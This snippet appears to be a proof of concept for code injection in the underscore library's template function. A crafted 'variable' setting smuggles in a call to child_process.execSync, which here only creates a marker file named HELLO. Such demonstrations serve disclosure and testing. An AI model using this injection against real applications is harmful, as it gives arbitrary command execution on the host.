const _ = require('underscore');
var settings = { variable: "a = this.process.mainModule.require('child_process').execSync('touch HELLO')" };
const t = _.template("", settings)();
